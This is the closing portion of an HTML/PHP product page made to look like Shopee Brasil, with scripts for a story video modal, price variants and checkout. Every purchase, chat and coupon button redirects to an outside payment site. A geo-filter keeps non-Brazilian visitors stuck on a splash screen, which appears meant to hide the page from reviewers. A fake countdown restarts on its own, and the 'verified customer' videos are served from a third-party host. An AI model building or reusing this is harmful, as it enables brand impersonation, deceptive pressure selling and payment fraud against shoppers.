<!-- Fixed Mobile Bottom Sticky Action Bar (Direct Child of Body) -->
<div class="shopee-fixed-bottom-bar" id="shopeeFixedBottomBar">
    <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="shopee-btn-teal" id="bottomChatBtn" aria-label="Conversar agora">
        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
        <span>Conversar agora</span>
    </a>
    <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="shopee-btn-teal" id="bottomCartBtn" aria-label="Adicionar ao carrinho">
        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path><line x1="12" y1="9" x2="16" y2="9"></line><line x1="14" y1="7" x2="14" y2="11"></line></svg>
        <span>Adicionar ao carrinho</span>
    </a>
    <button type="button" class="shopee-btn-orange" id="bottomBuyBtn">
        <span class="btn-top-txt">Compre com cupom</span>
        <span class="btn-price-txt" id="bottomBarPrice">R$ 87,90</span>
    </button>
</div>

<!-- Customer Stories Video Player Modal -->
<div id="shopeeStoryModal" class="shopee-story-modal" aria-hidden="true" role="dialog" aria-label="Vídeos de clientes">
    <div class="shopee-story-container">
        <!-- Top 6 Progress Bars -->
        <div class="shopee-story-top-bars" id="storyProgressBars">
            <div class="shopee-story-progress-bar"><div class="shopee-story-progress-fill"></div></div>
            <div class="shopee-story-progress-bar"><div class="shopee-story-progress-fill"></div></div>
            <div class="shopee-story-progress-bar"><div class="shopee-story-progress-fill"></div></div>
            <div class="shopee-story-progress-bar"><div class="shopee-story-progress-fill"></div></div>
            <div class="shopee-story-progress-bar"><div class="shopee-story-progress-fill"></div></div>
            <div class="shopee-story-progress-bar"><div class="shopee-story-progress-fill"></div></div>
        </div>

        <!-- Header Info -->
        <div class="shopee-story-header">
            <div class="shopee-story-user">
                <img id="storyUserAvatar" src="images/tg-story-1.webp" alt="Cliente" class="shopee-story-avatar">
                <div class="shopee-story-user-meta">
                    <div id="storyTitleText" class="shopee-story-info-title">Recebimento · 1/6</div>
                    <div class="shopee-story-info-sub">Cliente Verificado · Shopee Brasil</div>
                </div>
            </div>
            <button type="button" class="shopee-story-close-btn" id="storyCloseBtn" aria-label="Fechar vídeo">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
            </button>
        </div>

        <!-- Video Player Wrap -->
        <div class="shopee-story-video-wrap" id="storyVideoWrap">
            <video id="storyModalVideo" class="shopee-story-video" playsinline webkit-playsinline controls preload="none">
                Seu navegador não suporta a reprodução deste vídeo.
            </video>
            <!-- Navigation Chevrons -->
            <button type="button" class="shopee-story-nav-btn prev" id="storyPrevBtn" aria-label="Vídeo anterior">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
            </button>
            <button type="button" class="shopee-story-nav-btn next" id="storyNextBtn" aria-label="Próximo vídeo">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
            </button>
        </div>

        <!-- Bottom CTA -->
        <div class="shopee-story-bottom-cta">
            <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="shopee-story-cta-btn" id="storyCtaBtn">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg>
                <span>Compre com Desconto · R$ 87,90</span>
            </a>
        </div>
    </div>
</div>

<script>
window.SERVER_IS_BRAZIL = <?php echo isset($server_is_brazil) && $server_is_brazil !== null ? ($server_is_brazil ? 'true' : 'false') : 'null'; ?>;
// TRAFFIC FILTER: BRAZILIAN IP ONLY (BR)
(function() {
    var splash = document.getElementById('shopeeAppSplash');
    var mainContent = document.getElementById('main');
    if (!splash) return;

    // Strict input and scroll lock while splash is visible
    splash.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
    splash.addEventListener('wheel', function(e) { e.preventDefault(); }, { passive: false });

    var isBrazil = null; // null = checking, true = BR, false = foreign
    var minDelayPassed = false;
    var unlockExecuted = false;

    // Fast-path: local testing environment
    var host = window.location.hostname;
    if (host === 'localhost' || host === '127.0.0.1' || host === '::1' || host.indexOf('192.168.') === 0 || host.indexOf('10.') === 0 || host === '') {
        isBrazil = true;
    }

    // Server-side header hint
    if (window.SERVER_IS_BRAZIL !== null && window.SERVER_IS_BRAZIL !== undefined) {
        isBrazil = !!window.SERVER_IS_BRAZIL;
    }

    // Timer: exactly 2.5 seconds minimum delay
    setTimeout(function() {
        minDelayPassed = true;
        checkAndUnlock();
    }, 2500);

    function checkAndUnlock() {
        if (unlockExecuted) return;
        if (minDelayPassed && isBrazil === true) {
            unlockExecuted = true;
            // Smooth Dissolve Transition: Splash scales gently & fades out, Main reveals
            if (mainContent) {
                mainContent.classList.add('unlocked');
                mainContent.classList.add('traffic-verified');
                mainContent.style.opacity = '1';
                mainContent.style.pointerEvents = 'auto';
                mainContent.style.visibility = 'visible';
            }
            var bottomBar = document.getElementById('shopeeFixedBottomBar');
            if (bottomBar) {
                bottomBar.classList.add('traffic-verified');
                bottomBar.classList.add('unlocked');
                bottomBar.style.opacity = '1';
                bottomBar.style.pointerEvents = 'auto';
            }
            splash.classList.add('splash-hiding');
            setTimeout(function() {
                if (splash && splash.parentNode) {
                    splash.parentNode.removeChild(splash);
                }
            }, 600);
        }
        // If isBrazil === false: execution never reaches here. Trapped forever in splash.
    }

    // Client-side Geo-lookup for live production environments
    if (isBrazil === null) {
        var resolved = false;

        function markResult(br) {
            if (resolved) return;
            resolved = true;
            isBrazil = !!br;
            checkAndUnlock();
        }

        // Endpoint 1: ipapi.co
        var xhr1 = new XMLHttpRequest();
        xhr1.open('GET', 'https://ipapi.co/json/', true);
        xhr1.timeout = 3500;
        xhr1.onreadystatechange = function() {
            if (xhr1.readyState === 4 && xhr1.status === 200) {
                try {
                    var data = JSON.parse(xhr1.responseText);
                    var country = (data.country || data.country_code || '').toUpperCase();
                    markResult(country === 'BR');
                } catch(e) {}
            }
        };
        xhr1.onerror = xhr1.ontimeout = function() {
            // Fallback Endpoint 2: ipwho.is
            if (!resolved) {
                var xhr2 = new XMLHttpRequest();
                xhr2.open('GET', 'https://ipwho.is/', true);
                xhr2.timeout = 3500;
                xhr2.onreadystatechange = function() {
                    if (xhr2.readyState === 4 && xhr2.status === 200) {
                        try {
                            var data2 = JSON.parse(xhr2.responseText);
                            var country2 = (data2.country_code || '').toUpperCase();
                            markResult(country2 === 'BR');
                        } catch(err) {
                            markResult(false);
                        }
                    }
                };
                xhr2.onerror = xhr2.ontimeout = function() {
                    // Fallback to client browser timezone heuristics
                    try {
                        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
                        markResult(tz.indexOf('Sao_Paulo') !== -1 || tz.indexOf('Brazil') !== -1 || tz.indexOf('Recife') !== -1 || tz.indexOf('Manaus') !== -1 || tz.indexOf('Cuiaba') !== -1 || tz.indexOf('Fortaleza') !== -1 || tz.indexOf('Belem') !== -1);
                    } catch(ex) {
                        markResult(false);
                    }
                };
                xhr2.send();
            }
        };
        xhr1.send();
    } else {
        checkAndUnlock();
    }
})();

// Configuração dos Checkouts por Variação / Apresentação
var CHECKOUT_URLS = {
    '1': "https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568", // 1 Unidade (R$ 87,90)
    '2': "https://seguro.centralpag.online/api/public/shopify?product=156891449648&store=1568", // 2 Unidades (R$ 137,90)
    '4': "https://seguro.centralpag.online/api/public/shopify?product=156837437479&store=1568"  // 4 Unidades / Kit Completo (R$ 187,90)
};

// URL de checkout atualmente ativa
var CURRENT_CHECKOUT_URL = CHECKOUT_URLS['1'];

// Helper para encaminhar UTMs e parâmetros de URL
function getFinalCheckoutUrl(baseUrl) {
    var url = baseUrl || CURRENT_CHECKOUT_URL;
    if (window.location.search) {
        var cleanSearch = window.location.search.replace(/^\?/, '');
        if (cleanSearch) {
            var sep = url.indexOf('?') === -1 ? '?' : '&';
            url += sep + cleanSearch;
        }
    }
    return url;
}

document.addEventListener('DOMContentLoaded', function() {
    // Media Carousel Logic
    var track = document.getElementById('shopeeCarouselTrack');
    var wrapper = document.getElementById('shopeeCarouselWrapper');
    var badge = document.getElementById('slideBadge');
    var prevBtn = document.getElementById('carouselPrevBtn');
    var nextBtn = document.getElementById('carouselNextBtn');
    var thumbItems = document.querySelectorAll('.carousel-thumb-item');
    var stickyScrolledHeader = document.getElementById('shopeeStickyScrolledHeader');
    var scrollTopBtn = document.getElementById('scrollTopBtn');

    var currentIndex = 0;
    var slides = document.querySelectorAll('.shopee-carousel-slide');
    var totalSlides = slides.length || 5;

    function goToSlide(idx) {
        if (idx < 0) idx = 0;
        if (idx >= totalSlides) idx = totalSlides - 1;
        currentIndex = idx;
        var offset = -(currentIndex * 100);
        track.style.transform = 'translate3d(' + offset + '%, 0, 0)';
        if (badge) {
            badge.textContent = (currentIndex + 1) + '/' + totalSlides;
        }
        thumbItems.forEach(function(item, i) {
            if (i === currentIndex) {
                item.classList.add('active');
            } else {
                item.classList.remove('active');
            }
        });
    }

    if (prevBtn) {
        prevBtn.addEventListener('click', function(e) {
            e.preventDefault();
            goToSlide(currentIndex - 1);
        });
    }
    if (nextBtn) {
        nextBtn.addEventListener('click', function(e) {
            e.preventDefault();
            goToSlide(currentIndex + 1);
        });
    }

    thumbItems.forEach(function(item) {
        item.addEventListener('click', function() {
            var idx = parseInt(this.getAttribute('data-index'), 10);
            if (!isNaN(idx)) {
                goToSlide(idx);
            }
        });
    });

    // Touch Swipe handling
    var startX = 0;
    var distMoveX = 0;

    wrapper.addEventListener('touchstart', function(e) {
        if (e.touches.length === 1) {
            startX = e.touches[0].clientX;
            distMoveX = 0;
        }
    }, { passive: true });

    wrapper.addEventListener('touchmove', function(e) {
        if (e.touches.length === 1) {
            distMoveX = e.touches[0].clientX - startX;
        }
    }, { passive: true });

    wrapper.addEventListener('touchend', function(e) {
        if (Math.abs(distMoveX) > 40) {
            if (distMoveX < 0) {
                goToSlide(currentIndex + 1);
            } else {
                goToSlide(currentIndex - 1);
            }
        }
    });

    // Sticky Header & Scroll Top
    window.addEventListener('scroll', function() {
        var scrollY = window.pageYOffset || document.documentElement.scrollTop;
        if (scrollY > 150) {
            stickyScrolledHeader.classList.add('visible');
            scrollTopBtn.classList.add('visible');
        } else {
            stickyScrolledHeader.classList.remove('visible');
            scrollTopBtn.classList.remove('visible');
        }
    }, { passive: true });

    if (scrollTopBtn) {
        scrollTopBtn.addEventListener('click', function() {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });
    }

    // Packages / Variations Selection
    var packageCards = document.querySelectorAll('.package-card');
    var mainDisplayPrice = document.getElementById('mainDisplayPrice');
    var mainOldPrice = document.getElementById('mainOldPrice');
    var selectedVarName = document.getElementById('selectedVarName');
    var titleVariationTxt = document.getElementById('titleVariationTxt');
    var bottomBarPrice = document.getElementById('bottomBarPrice');

    packageCards.forEach(function(card) {
        card.addEventListener('click', function() {
            packageCards.forEach(function(c) { c.classList.remove('selected'); });
            this.classList.add('selected');

            var pkg = this.getAttribute('data-pkg') || '1';
            var price = this.getAttribute('data-price');
            var oldPrice = this.getAttribute('data-old');
            var title = this.getAttribute('data-title');
            var slideIdx = parseInt(this.getAttribute('data-slide'), 10);

            // Atualiza checkout ativo para a variação escolhida
            if (CHECKOUT_URLS[pkg]) {
                CURRENT_CHECKOUT_URL = CHECKOUT_URLS[pkg];
            } else if (this.getAttribute('data-checkout-url')) {
                CURRENT_CHECKOUT_URL = this.getAttribute('data-checkout-url');
            }

            if (mainDisplayPrice) mainDisplayPrice.textContent = price;
            if (mainOldPrice) mainOldPrice.textContent = 'R$ ' + oldPrice;
            if (bottomBarPrice) bottomBarPrice.textContent = 'R$ ' + price;
            if (selectedVarName) selectedVarName.textContent = title;
            if (titleVariationTxt) titleVariationTxt.textContent = title;

            // Atualiza link e texto do botão CTA no modal de Stories
            var storyCta = document.getElementById('storyCtaBtn');
            if (storyCta) {
                storyCta.setAttribute('href', CURRENT_CHECKOUT_URL);
                var storyCtaSpan = storyCta.querySelector('span');
                if (storyCtaSpan) storyCtaSpan.textContent = 'Compre com Desconto · R$ ' + price;
            }

            // Atualiza href do botão de carrinho inferior
            var bottomCart = document.getElementById('bottomCartBtn');
            if (bottomCart) {
                bottomCart.setAttribute('href', CURRENT_CHECKOUT_URL);
            }

            if (!isNaN(slideIdx) && slideIdx < totalSlides) {
                goToSlide(slideIdx);
            }
        });
    });

    // Description expand/collapse
    var descExpandBtn = document.getElementById('descExpandBtn');
    var descText = document.getElementById('descText');

    if (descExpandBtn && descText) {
        descExpandBtn.addEventListener('click', function() {
            if (descText.classList.contains('expanded')) {
                descText.classList.remove('expanded');
                descExpandBtn.innerHTML = 'Ver Mais <span class="arrow-indicator">∨</span>';
            } else {
                descText.classList.add('expanded');
                descExpandBtn.innerHTML = 'Ver Menos <span class="arrow-indicator" style="transform:rotate(180deg)">∨</span>';
            }
        });
    }

    // Specifications toggle
    var specsToggle = document.getElementById('specsToggle');
    var specsBody = document.getElementById('specsBody');

    if (specsToggle && specsBody) {
        specsToggle.addEventListener('click', function() {
            if (specsBody.style.display === 'none') {
                specsBody.style.display = 'block';
            } else {
                specsBody.style.display = 'none';
            }
        });
    }

    // Oferta Relâmpago live countdown timer
    var minutes = 19;
    var seconds = 42;
    var timerMinEl = document.getElementById('timerMin');
    var timerSecEl = document.getElementById('timerSec');

    setInterval(function() {
        if (seconds > 0) {
            seconds--;
        } else {
            if (minutes > 0) {
                minutes--;
                seconds = 59;
            } else {
                minutes = 20;
                seconds = 0;
            }
        }
        if (timerMinEl) timerMinEl.textContent = minutes < 10 ? '0' + minutes : minutes;
        if (timerSecEl) timerSecEl.textContent = seconds < 10 ? '0' + seconds : seconds;
    }, 1000);

    // SHOPEE CUSTOMER STORIES VIDEO MODAL LOGIC
    var storyData = [
        {
            title: 'Recebimento',
            sub: 'Vídeo 1 de 6 · Cliente verificado',
            thumb: 'images/tg-story-1.webp',
            video: 'images/tg-customer-story-1.mp4',
            fallback: 'https://tshop15.store/__l5e/assets-v1/20393416-e4ad-412c-8af7-f76fb9106131/tg-customer-story-1.mp4'
        },
        {
            title: 'Unboxing',
            sub: 'Vídeo 2 de 6 · Caixa com 4 frascos',
            thumb: 'images/tg-story-2.webp',
            video: 'images/tg-customer-story-2.mp4',
            fallback: 'https://tshop15.store/__l5e/assets-v1/ee2abeae-1385-4169-928e-58750fb53b3d/tg-customer-story-2.mp4'
        },
        {
            title: 'Frasco',
            sub: 'Vídeo 3 de 6 · Detalhes do frasco e lacre',
            thumb: 'images/tg-story-3.webp',
            video: 'images/tg-customer-story-3.mp4',
            fallback: 'https://tshop15.store/__l5e/assets-v1/a2f50c67-663e-4230-b1fa-4f19fd52f3d4/tg-customer-story-3.mp4'
        },
        {
            title: 'Embalagem',
            sub: 'Vídeo 4 de 6 · Proteção térmica com gelo',
            thumb: 'images/tg-story-4.webp',
            video: 'images/tg-customer-story-4.mp4',
            fallback: 'https://tshop15.store/__l5e/assets-v1/9132d621-6777-4ed8-813a-b4aec783cdff/tg-customer-story-4.mp4'
        },
        {
            title: 'Detalhes',
            sub: 'Vídeo 5 de 6 · Selo de autenticidade e QR',
            thumb: 'images/tg-story-5.webp',
            video: 'images/tg-customer-story-5.mp4',
            fallback: 'https://tshop15.store/__l5e/assets-v1/d877166b-977b-47e8-b2ed-ab1e188f51ad/tg-customer-story-5.mp4'
        },
        {
            title: 'Abertura',
            sub: 'Vídeo 6 de 6 · Uso e preparo do kit',
            thumb: 'images/tg-story-6.webp',
            video: 'images/tg-customer-story-6.mp4',
            fallback: 'https://tshop15.store/__l5e/assets-v1/d6b3cd36-b9f0-47de-9346-60e59047f509/tg-customer-story-6.mp4'
        }
    ];

    var storyModal = document.getElementById('shopeeStoryModal');
    var storyVideo = document.getElementById('storyModalVideo');
    var storyAvatar = document.getElementById('storyUserAvatar');
    var storyTitle = document.getElementById('storyTitleText');
    var storyCloseBtn = document.getElementById('storyCloseBtn');
    var storyPrevBtn = document.getElementById('storyPrevBtn');
    var storyNextBtn = document.getElementById('storyNextBtn');
    var storyBars = document.querySelectorAll('.shopee-story-progress-fill');
    var currentStoryIdx = 0;
    var isStoryOpen = false;

    function updateStoryProgress() {
        if (!isStoryOpen || !storyVideo || !storyBars.length) return;
        var pct = 0;
        if (storyVideo.duration) {
            pct = (storyVideo.currentTime / storyVideo.duration) * 100;
        }
        storyBars.forEach(function(bar, idx) {
            if (idx < currentStoryIdx) {
                bar.style.width = '100%';
            } else if (idx === currentStoryIdx) {
                bar.style.width = pct + '%';
            } else {
                bar.style.width = '0%';
            }
        });
    }

    function openStory(idx) {
        if (idx < 0) idx = 0;
        if (idx >= storyData.length) idx = 0;
        currentStoryIdx = idx;
        isStoryOpen = true;
        var data = storyData[idx];

        if (storyTitle) storyTitle.textContent = data.title + ' · ' + (idx + 1) + '/' + storyData.length;
        if (storyAvatar) storyAvatar.src = data.thumb;

        if (storyVideo) {
            storyVideo.onerror = null;
            storyVideo.pause();

            // Limpa filhos de source anteriores para evitar conflitos de carregamento
            while (storyVideo.firstChild) {
                storyVideo.removeChild(storyVideo.firstChild);
            }

            storyVideo.src = data.video;
            storyVideo.onerror = function() {
                if (!isStoryOpen) return;
                if (data.fallback && storyVideo.src !== data.fallback) {
                    storyVideo.onerror = null;
                    storyVideo.src = data.fallback;
                    storyVideo.load();
                    var fallbackPromise = storyVideo.play();
                    if (fallbackPromise !== undefined) {
                        fallbackPromise.catch(function() {
                            if (!isStoryOpen) return;
                            storyVideo.muted = true;
                            storyVideo.play().catch(function() {});
                        });
                    }
                }
            };

            storyVideo.load();
            var playPromise = storyVideo.play();
            if (playPromise !== undefined) {
                playPromise.catch(function() {
                    if (!isStoryOpen) return;
                    storyVideo.muted = true;
                    storyVideo.play().catch(function() {});
                });
            }
        }

        updateStoryProgress();

        if (storyModal) {
            storyModal.classList.add('active');
            storyModal.setAttribute('aria-hidden', 'false');
            document.body.style.overflow = 'hidden';
        }
    }

    function closeStory() {
        isStoryOpen = false;

        if (storyVideo) {
            storyVideo.onerror = null;
            storyVideo.pause();
            storyVideo.removeAttribute('src');
            while (storyVideo.firstChild) {
                storyVideo.removeChild(storyVideo.firstChild);
            }
            try {
                storyVideo.currentTime = 0;
            } catch (err) {}
            storyVideo.load();
        }

        if (storyBars && storyBars.length) {
            storyBars.forEach(function(bar) {
                bar.style.width = '0%';
            });
        }

        if (storyModal) {
            storyModal.classList.remove('active');
            storyModal.setAttribute('aria-hidden', 'true');
            document.body.style.overflow = '';
        }
    }

    if (storyVideo) {
        storyVideo.addEventListener('timeupdate', updateStoryProgress);
        storyVideo.addEventListener('ended', function() {
            if (!isStoryOpen) return;
            if (currentStoryIdx < storyData.length - 1) {
                openStory(currentStoryIdx + 1);
            } else {
                closeStory();
            }
        });
    }

    if (storyCloseBtn) {
        storyCloseBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            closeStory();
        });
    }

    if (storyModal) {
        storyModal.addEventListener('click', function(e) {
            if (e.target === storyModal) {
                closeStory();
            }
        });
    }

    var storyCtaBtn = document.getElementById('storyCtaBtn');
    if (storyCtaBtn) {
        storyCtaBtn.addEventListener('click', function() {
            closeStory();
        });
    }

    if (storyPrevBtn) {
        storyPrevBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            if (currentStoryIdx > 0) {
                openStory(currentStoryIdx - 1);
            } else {
                openStory(0);
            }
        });
    }

    if (storyNextBtn) {
        storyNextBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            if (currentStoryIdx < storyData.length - 1) {
                openStory(currentStoryIdx + 1);
            } else {
                closeStory();
            }
        });
    }

    // Story bubble click
    document.querySelectorAll('.shopee-story-item').forEach(function(item) {
        item.addEventListener('click', function(e) {
            e.preventDefault();
            var idx = parseInt(this.getAttribute('data-story-index'), 10);
            if (!isNaN(idx)) {
                openStory(idx);
            }
        });
    });

    // "Ver todos >" click opens story 0
    var seeAllBtn = document.getElementById('storySeeAllBtn');
    if (seeAllBtn) {
        seeAllBtn.addEventListener('click', function(e) {
            e.preventDefault();
            openStory(0);
        });
    }

    // Close on escape
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && storyModal && storyModal.classList.contains('active')) {
            closeStory();
        }
    });

    // REDIRECT ALL BUY / CONVERSION ACTIONS (Preserving UTMs)
    var checkoutElements = [
        '#bottomBuyBtn',
        '#bottomCartBtn',
        '#bottomChatBtn',
        '#storyCtaBtn',
        '.shopee-cart-btn',
        '.scrolled-cart-btn',
        '.shopee-store-visit-btn',
        '.shopee-see-all',
        '.shopee-shipping-card',
        '.shopee-coupon-pill'
    ];

    checkoutElements.forEach(function(selector) {
        document.querySelectorAll(selector).forEach(function(el) {
            el.addEventListener('click', function(e) {
                e.preventDefault();
                window.location.href = getFinalCheckoutUrl(CURRENT_CHECKOUT_URL);
            });
        });
    });
});
</script>

</body>
</html>